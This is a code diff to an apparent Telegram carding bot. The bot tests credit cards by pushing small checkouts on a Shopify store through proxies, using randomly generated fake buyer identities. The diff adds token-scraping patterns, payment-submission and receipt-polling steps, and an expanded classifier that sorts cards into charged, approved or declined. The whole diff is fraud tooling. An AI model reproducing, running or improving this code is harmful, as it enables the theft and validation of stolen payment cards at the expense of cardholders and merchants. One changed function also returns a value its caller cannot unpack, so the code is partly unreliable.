@@ -15,6 +15,7 @@ from pyrogram.types import Message
 import html
 import os
 import unicodedata
+import uuid
 
 # Import from helper modules
 try:
@@ -106,6 +107,7 @@ def strip_all_unicode(text):
     
     cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
     cleaned = re.sub(r'\s+', ' ', cleaned)
+    
     return cleaned.strip()
 
 def extract_card_from_cleaned_text(text):
@@ -139,14 +141,17 @@ def extract_card_from_cleaned_text(text):
             len(potential_mes) in [1, 2] and 
             len(potential_ano) in [2, 4] and 
             len(potential_cvv) in [3, 4]):
+            
             try:
                 mes_int = int(potential_mes)
                 if 1 <= mes_int <= 12:
                     current_year = datetime.now().year % 100
+                    
                     if len(potential_ano) == 4:
                         ano_val = int(potential_ano) % 100
                     else:
                         ano_val = int(potential_ano)
+                    
                     if current_year - 5 <= ano_val <= current_year + 10:
                         cc = potential_cc
                         mes = potential_mes.zfill(2)
@@ -464,6 +469,12 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "EXPIRED_CARD"
         elif "FRAUD" in raw_response.upper():
             response_display = "FRAUD"
+        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
+            response_display = "TAX_CHANGE"
+        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
+            response_display = "PAYMENT_AMOUNT_ERROR"
+        elif "PROCESSING_TIMEOUT" in raw_response:
+            response_display = "PROCESSING_TIMEOUT"
         else:
             if ":" in raw_response:
                 response_display = raw_response.split(":")[0].strip()
@@ -480,22 +491,57 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
             "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
             "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
-            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "PROCESSEDRECEIPT",
-            "THANK YOU", "PAYMENT_SUCCESSFUL", "PROCESSINGRECEIPT", "AUTHORIZED",
-            "YOUR ORDER IS CONFIRMED"
+            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
+            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
+            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
         ]):
             status_flag = "Charged ✅"
         elif any(keyword in raw_response_upper for keyword in [
             "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
             "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
-            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION"
+            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
+            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
+            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
         ]):
             status_flag = "Captcha ⚠️"
         elif any(keyword in raw_response_upper for keyword in [
+            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
+            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
+            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
+            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
             "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
-            "3DS", "PENDING", "SECURE REQUIRED", "ACTION_REQUIRED"
+            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
+            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
+            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
+            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
         ]):
             status_flag = "Approved ❎"
+        elif any(keyword in raw_response_upper for keyword in [
+            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
+        ]):
+            status_flag = "Declined ❌"
+        elif any(keyword in raw_response_upper for keyword in [
+            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
+            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
+        ]):
+            status_flag = "Fraud ⚠️"
+        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
+            status_flag = "Proxy Error 🚫"
         else:
             status_flag = "Declined ❌"
 
@@ -543,15 +589,14 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     return result
 
 
-# ========== ROUTE CHARGE CHECKOUT CLASS (ORIGINAL DIRECT CHECKOUT - NO ADD TO CART) ==========
+# ========== ROUTE CHARGE CHECKOUT CLASS (DIRECT CHECKOUT - NO ADD TO CART) ==========
 class RouteChargeCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
         self.base_url = "https://zero936.com"
         
-        # Direct checkout URL (NO add-to-cart)
+        # Direct checkout variant ID (the $0.98 product)
         self.variant_id = "51087094219071"
-        self.checkout_url = f"{self.base_url}/checkout/{self.variant_id}:1"
         
         # Proxy management
         self.proxy_url = None
@@ -585,14 +630,18 @@ class RouteChargeCheckout:
         self.build_id = None
         self.payment_method_identifier = None
         self.signed_handles = []
-
-        # Random data
-        self.first_names = ["James", "Robert", "John", "Michael", "David", "William"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        
+        # Random data for checkout
+        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
+                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
+                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson"]
+        
         self.first_name = random.choice(self.first_names)
         self.last_name = random.choice(self.last_names)
+        self.full_name = f"{self.first_name} {self.last_name}"
         self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
-        self.phone = f"215{random.randint(100,999)}{random.randint(1000,9999)}"
+        self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
         self.logger = ShopifyLogger(user_id)
 
@@ -605,15 +654,14 @@ class RouteChargeCheckout:
     def generate_uuid(self):
         return str(uuid.uuid4())
 
-    def generate_random_string(self, length=16):
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-
     def get_random_address(self):
+        """Generate random US address"""
         streets = ["Maple St", "Oak Ave", "Washington Blvd", "Lakeview Dr", "Park Way", "Broadway"]
         cities = [
-            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
-            ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
-            ("Miami", "FL", "33101"), ("Seattle", "WA", "98101")
+            ("Los Angeles", "CA", "90001"), ("New York", "NY", "10001"),
+            ("Houston", "TX", "77001"), ("Miami", "FL", "33101"),
+            ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001"),
+            ("Seattle", "WA", "98101"), ("Denver", "CO", "80201")
         ]
         street = f"{random.randint(100, 9999)} {random.choice(streets)}"
         city, state, zp = random.choice(cities)
@@ -629,51 +677,31 @@ class RouteChargeCheckout:
             "phone": self.phone
         }
 
-    def extract_checkout_token(self, url):
-        patterns = [
-            r'/checkouts/cn/([^/?]+)',
-            r'token=([^&]+)',
-            r'checkout_token=([^&]+)',
-            r'checkouts/([^/?]+)',
-        ]
-        for pattern in patterns:
-            match = re.search(pattern, url)
-            if match:
-                return match.group(1)
-        return None
-
-    async def get_checkout_token_direct(self):
-        """Step 1: Direct checkout access - NO add-to-cart"""
-        self.step(1, "DIRECT CHECKOUT ACCESS", f"Accessing: {self.checkout_url}")
+    async def direct_checkout_access(self):
+        """Step 1: Direct checkout access - NO ADD TO CART"""
+        self.step(1, "DIRECT CHECKOUT ACCESS", f"Accessing checkout URL: {self.base_url}/checkout/{self.variant_id}:1")
+        
+        checkout_url = f"{self.base_url}/checkout/{self.variant_id}:1"
         
         try:
-            resp = await self.client.get(
-                self.checkout_url,
-                headers=self.headers,
-                follow_redirects=True,
-                timeout=30
-            )
-            
+            resp = await self.client.get(checkout_url, follow_redirects=True, timeout=30)
             final_url = str(resp.url)
             self.logger.data_extracted("Final URL", final_url)
             
-            self.checkout_token = self.extract_checkout_token(final_url)
-            
-            if not self.checkout_token and resp.text:
-                token_patterns = [
-                    r'checkout_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                    r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-                    r'"token":"([^"]+)"',
-                ]
-                for pattern in token_patterns:
-                    match = re.search(pattern, resp.text)
-                    if match:
-                        self.checkout_token = match.group(1)
-                        break
-            
-            if self.checkout_token:
+            # Extract checkout token from URL
+            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', final_url)
+            if match:
+                self.checkout_token = match.group(1)
                 self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...")
-                return True, final_url
+                return True
+            
+            # Try to find token in response body
+            if resp.text:
+                token_match = re.search(r'checkout_token["\']?\s*[:=]\s*["\']([^"\']+)["\']', resp.text)
+                if token_match:
+                    self.checkout_token = token_match.group(1)
+                    self.logger.data_extracted("Checkout Token (from body)", self.checkout_token[:20] + "...")
+                    return True
             
             return False, "No checkout token found"
             
@@ -682,7 +710,7 @@ class RouteChargeCheckout:
             return False, str(e)[:50]
 
     async def extract_checkout_metadata(self):
-        """Step 2: Extract all required metadata from checkout page"""
+        """Step 2: Extract session tokens from checkout page"""
         self.step(2, "EXTRACT METADATA", "Extracting tokens from checkout page")
         
         checkout_page_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}"
@@ -691,11 +719,12 @@ class RouteChargeCheckout:
             resp = await self.client.get(checkout_page_url, timeout=30)
             html_content = resp.text
             
-            # Extract session token
+            # Extract session token (AAEB...)
             session_patterns = [
                 r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                 r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                 r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
+                r'\"sessionToken\":\"(AAEB[^\"]+)',
             ]
             for pattern in session_patterns:
                 match = re.search(pattern, html_content)
@@ -732,6 +761,21 @@ class RouteChargeCheckout:
             
             if not self.stable_id:
                 self.stable_id = self.generate_uuid()
+                self.logger.data_extracted("Stable ID (Generated)", self.stable_id)
+            else:
+                self.logger.data_extracted("Stable ID", self.stable_id)
+            
+            # Extract payment method identifier
+            pm_patterns = [
+                r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
+                r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"',
+            ]
+            for pattern in pm_patterns:
+                match = re.search(pattern, html_content)
+                if match:
+                    self.payment_method_identifier = match.group(1)
+                    self.logger.data_extracted("Payment Method ID", self.payment_method_identifier[:20] + "...")
+                    break
             
             # Extract build ID
             build_patterns = [
@@ -746,23 +790,13 @@ class RouteChargeCheckout:
             
             if not self.build_id:
                 self.build_id = '4663384ede457d59be87980de7797171b19f2a1b'
+            self.logger.data_extracted("Build ID", self.build_id[:20] + "...")
             
             # Extract signed handles
             signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html_content)
             if not signed_handles:
                 signed_handles = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', html_content)
             self.signed_handles = [h.replace('\\n', '').replace('\\r', '') for h in signed_handles]
-            
-            # Extract payment method identifier
-            pm_patterns = [
-                r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
-                r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"',
-            ]
-            for pattern in pm_patterns:
-                match = re.search(pattern, html_content)
-                if match:
-                    self.payment_method_identifier = match.group(1)
-                    break
             
             return True if self.session_token else False
             
@@ -773,6 +807,10 @@ class RouteChargeCheckout:
     async def create_pci_session(self, cc, mes, ano, cvv):
         """Step 3: Create PCI payment session"""
         self.step(3, "CREATE PCI SESSION", "Creating payment session")
+        
+        address = self.get_random_address()
+        card_number = cc.replace(" ", "").replace("-", "")
+        year_full = ano if len(ano) == 4 else f"20{ano}"
         
         pci_headers = {
             'accept': 'application/json',
@@ -788,10 +826,6 @@ class RouteChargeCheckout:
             'sec-fetch-site': 'same-origin',
             'user-agent': self.headers['user-agent']
         }
-        
-        address = self.get_random_address()
-        card_number = cc.replace(" ", "").replace("-", "")
-        year_full = ano if len(ano) == 4 else f"20{ano}"
         
         pci_payload = {
             "credit_card": {
@@ -832,6 +866,7 @@ class RouteChargeCheckout:
         self.step(4, "SUBMIT PAYMENT", "Submitting payment")
         
         graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
+        address = self.get_random_address()
         
         graphql_headers = {
             'accept': 'application/json',
@@ -853,14 +888,13 @@ class RouteChargeCheckout:
             'x-checkout-web-build-id': self.build_id
         }
         
-        address = self.get_random_address()
-        attempt_token = f"{self.checkout_token}-{self.generate_random_string(9)}"
+        attempt_token = f"{self.checkout_token}-{self.generate_uuid()[:8]}"
         pm_identifier = self.payment_method_identifier or payment_session_id
         
         # Build delivery expectation lines
-        delivery_lines = [{"signedHandle": sh} for sh in self.signed_handles[:3]] if self.signed_handles else []
+        delivery_expectation_lines = [{"signedHandle": sh} for sh in self.signed_handles[:3]] if self.signed_handles else []
         
-        MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter queueToken __typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'''
+        MUTATION = '''mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code __typename}__typename}__typename}...on Throttled{pollAfter queueToken __typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}__typename}__typename}__typename}'''
         
         payload = {
             "query": MUTATION,
@@ -905,7 +939,7 @@ class RouteChargeCheckout:
                         "noDeliveryRequired": [],
                         "supportsSplitShipping": True
                     },
-                    "deliveryExpectations": {"deliveryExpectationLines": delivery_lines},
+                    "deliveryExpectations": {"deliveryExpectationLines": delivery_expectation_lines},
                     "merchandise": {
                         "merchandiseLines": [{
                             "stableId": self.stable_id,
@@ -982,7 +1016,8 @@ class RouteChargeCheckout:
             result = resp.json()
             
             if 'errors' in result:
-                return False, f"DECLINED - {result['errors'][0].get('message', 'GraphQL Error')[:50]}"
+                error_msg = result['errors'][0].get('message', 'GraphQL Error')
+                return False, f"DECLINED - {error_msg[:50]}"
             
             data = result.get('data', {}).get('submitForCompletion', {})
             typename = data.get('__typename', '')
@@ -1020,7 +1055,7 @@ class RouteChargeCheckout:
 
     async def poll_receipt(self, receipt_id):
         """Step 5: Poll for receipt"""
-        self.step(5, "POLL RECEIPT", f"Polling receipt")
+        self.step(5, "POLL RECEIPT", f"Polling receipt: {receipt_id}")
         
         graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
         
@@ -1036,9 +1071,9 @@ class RouteChargeCheckout:
             'x-checkout-web-build-id': self.build_id
         }
         
-        POLL_QUERY = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token}...on ProcessingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'''
+        POLL_QUERY = '''query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token}...on ProcessingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code}}}}}'''
         
-        for attempt in range(15):
+        for attempt in range(20):
             try:
                 poll_payload = {
                     "query": POLL_QUERY,
@@ -1086,7 +1121,7 @@ class RouteChargeCheckout:
         return False, "DECLINED - Polling timeout"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution - DIRECT CHECKOUT ONLY (NO ADD TO CART)"""
+        """Main checkout execution - DIRECT CHECKOUT ONLY, NO ADD TO CART"""
         try:
             # Step 0: Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
@@ -1104,13 +1139,13 @@ class RouteChargeCheckout:
                 self.client = httpx.AsyncClient(timeout=30)
                 self.proxy_status = "No Proxy"
             
-            # Step 1: Direct checkout access (NO add-to-cart)
-            success, result = await self.get_checkout_token_direct()
+            # Step 1: Direct checkout access (NO ADD TO CART)
+            success, result = await self.direct_checkout_access()
             if not success:
                 return False, result
             await self.random_delay(0.1, 0.2)
             
-            # Step 2: Extract metadata
+            # Step 2: Extract metadata from checkout page
             if not await self.extract_checkout_metadata():
                 return False, "Failed to extract checkout metadata"
             await self.random_delay(0.1, 0.2)
@@ -1125,6 +1160,10 @@ class RouteChargeCheckout:
             success, result = await self.submit_payment(payment_id)
             if not success:
                 return False, result
+            
+            # If we got 3DS, return approved
+            if result == "APPROVED - 3DS Required":
+                return True, result
             
             receipt_id = result
             
